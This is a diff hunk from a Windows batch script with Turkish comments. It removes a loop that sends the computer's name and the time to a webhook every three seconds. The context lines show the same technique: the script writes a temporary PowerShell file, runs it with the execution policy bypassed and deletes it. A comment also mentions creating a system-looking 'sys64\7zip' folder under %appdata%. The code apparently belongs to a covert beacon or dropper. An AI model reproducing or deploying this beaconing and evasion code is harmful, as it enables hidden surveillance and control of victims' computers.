@@ -22,20 +22,6 @@ powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUr
 :: Delete the temporary PowerShell script
 del SendWebhook.ps1
 
-:: Ping every 3 seconds with the current time
-:ping_loop
-set "pingMessage=Ping at %time% on %COMPUTERNAME%."
-echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
-echo $body = ^@^{ >> SendWebhook.ps1
-echo content = $message >> SendWebhook.ps1
-echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
-echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1
-
-powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%pingMessage%"
-del SendWebhook.ps1
-timeout /t 3 >nul
-goto ping_loop
-
 :: Continue with the rest of the script
 
 :: %appdata% yolunda sys64\7zip klasörü oluştur
